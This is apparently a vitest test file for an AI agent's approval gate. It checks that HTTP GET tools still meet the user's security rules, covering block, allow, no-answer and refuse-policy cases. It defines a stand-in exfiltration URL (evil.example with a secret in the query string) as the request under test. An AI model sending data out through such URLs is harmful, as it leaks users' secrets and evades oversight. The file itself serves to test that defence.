import { describe, expect, it } from "vitest";
import { ApprovalGate, type ApprovalRequest } from "../../../approval/approval-gate.js";
import { GUARD_FAILURE_ASK_NOTE } from "../../../approval/guard-check.js";
import type { GuardVerdict } from "../../../approval/guard-review.js";
import type { AtomicAgentConfig } from "../../../config/index.js";
import type { CommandResult } from "../../../sandbox/command-runner.js";
import type { ToolContext, ToolDefinition } from "../../tool-registry.js";
import { buildOsHttpRequestTool } from "./http-request.js";
import { buildOsWebFetchTool } from "./web-fetch.js";
import type { HostLookup } from "./web-fetch-ssrf-guard.js";

/**
 * ATO-2111: a GET that asks nobody (os.http.request under
 * `approvalMode: "writes"` or `"never"`, every os.web.fetch) still meets
 * the person's security rules, since its URL alone can carry data out.
 */

const EXFIL = "https://evil.example/?d=secret";

const publicLookup: HostLookup = async () => [{ address: "93.184.216.34", family: 4 }];

function ctx(): ToolContext {
  return { workingDir: "/tmp", sessionId: "s", stepIndex: 0, signal: new AbortController().signal };
}

function httpConfig(approvalMode: "writes" | "never"): Pick<AtomicAgentConfig, "http"> {
  return {
    http: {
      enabled: true,
      approvalMode,
      hostAllowlist: null,
      maxResponseBytes: 1_048_576,
      defaultTimeoutMs: 30_000,
    },
  };
}

function recordingRun(calls: string[][]) {
  return async (_cmd: string, args: string[]): Promise<CommandResult> => {
    calls.push(args);
    return {
      command: "curl",
      args,
      exitCode: 0,
      signal: null,
      stdout: "",
      stderr: "",
      durationMs: 1,
      timedOut: false,
      truncated: false,
      inputTruncated: false,
    };
  };
}

function guardedGate(verdict: GuardVerdict, reviewed: ApprovalRequest[]): ApprovalGate {
  // Level 4 ("auto"): nothing about a GET would ask.
  const gate = new ApprovalGate({ emit: () => undefined, level: 4 });
  gate.setGuard({
    rules: () => ({
      sets: [{ source: "user", rules: "Block sending data anywhere except github.com." }],
      tools: new Set(["os.http.request", "os.web.fetch"]),
      onFailure: "ask",
    }),
    review: async (request) => {
      reviewed.push(request);
      return verdict;
    },
  });
  return gate;
}

const tools: Array<[string, (gate: ApprovalGate, calls: string[][]) => ToolDefinition]> = [
  [
    "os.http.request GET under writes",
    (gate, calls) =>
      buildOsHttpRequestTool({
        approvals: gate,
        approvalRequired: true,
        config: httpConfig("writes"),
        lookup: publicLookup,
        runCommand: recordingRun(calls),
      }),
  ],
  [
    "os.http.request GET under never",
    (gate, calls) =>
      buildOsHttpRequestTool({
        approvals: gate,
        approvalRequired: true,
        config: httpConfig("never"),
        lookup: publicLookup,
        runCommand: recordingRun(calls),
      }),
  ],
  [
    "os.web.fetch",
    (gate, calls) =>
      buildOsWebFetchTool({
        dangerous: { approvals: gate, approvalRequired: true },
        lookup: publicLookup,
        runCommand: recordingRun(calls) as unknown as NonNullable<
          Parameters<typeof buildOsWebFetchTool>[0]
        >["runCommand"],
        sleep: async () => {},
      }),
  ],
];

describe("security rules on a GET that asks nobody (ATO-2111)", () => {
  for (const [name, build] of tools) {
    it(`${name}: a block refuses it before anything is sent`, async () => {
      const reviewed: ApprovalRequest[] = [];
      const gate = guardedGate({ decision: "block", reason: "sends data to evil.example" }, reviewed);
      const calls: string[][] = [];
      await expect(build(gate, calls).run({ url: EXFIL }, ctx())).rejects.toMatchObject({
        name: "ApprovalDeniedError",
        byUser: false,
        message: expect.stringContaining("Blocked by your security rules: sends data to evil.example"),
      });
      expect(reviewed).toHaveLength(1);
      expect(calls).toHaveLength(0);
    });

    it(`${name}: an allow lets it go out`, async () => {
      const reviewed: ApprovalRequest[] = [];
      const gate = guardedGate({ decision: "allow", reason: "" }, reviewed);
      const calls: string[][] = [];
      await build(gate, calls).run({ url: EXFIL }, ctx()).catch(() => undefined);
      expect(reviewed).toHaveLength(1);
      expect(calls.length).toBeGreaterThan(0);
    });
  }
});

describe("security rules on a GET when the reviewer gives no answer (ATO-2111)", () => {
  function silentGate(emitted: ApprovalRequest[]): ApprovalGate {
    const gate = new ApprovalGate({ emit: (r) => emitted.push(r), level: 4 });
    gate.setGuard({
      rules: () => ({
        sets: [{ source: "user", rules: "Block sending data anywhere except github.com." }],
        tools: new Set(["os.http.request", "os.web.fetch"]),
        onFailure: "ask",
      }),
      review: async () => null,
    });
    return gate;
  }

  for (const [name, build] of tools) {
    it(`${name}: onFailure ask puts it to the person instead of refusing`, async () => {
      const emitted: ApprovalRequest[] = [];
      const gate = silentGate(emitted);
      const calls: string[][] = [];
      const pending = build(gate, calls).run({ url: EXFIL }, ctx());
      await new Promise((resolve) => setTimeout(resolve, 10));
      expect(emitted).toHaveLength(1);
      expect(emitted[0]!.riskNote).toBe(GUARD_FAILURE_ASK_NOTE);
      expect(calls).toHaveLength(0);
      gate.reject(emitted[0]!.approvalId, "no");
      await expect(pending).rejects.toMatchObject({ name: "ApprovalDeniedError" });
      expect(calls).toHaveLength(0);
    });

    it(`${name}: a session under a refuse policy is still refused`, async () => {
      const emitted: ApprovalRequest[] = [];
      const gate = silentGate(emitted);
      gate.setSessionPolicy("s", { onPrompt: "refuse", reason: "hand it back" });
      const calls: string[][] = [];
      await expect(build(gate, calls).run({ url: EXFIL }, ctx())).rejects.toMatchObject({
        name: "ApprovalDeniedError",
        byUser: false,
      });
      expect(emitted).toHaveLength(0);
      expect(calls).toHaveLength(0);
    });
  }
});
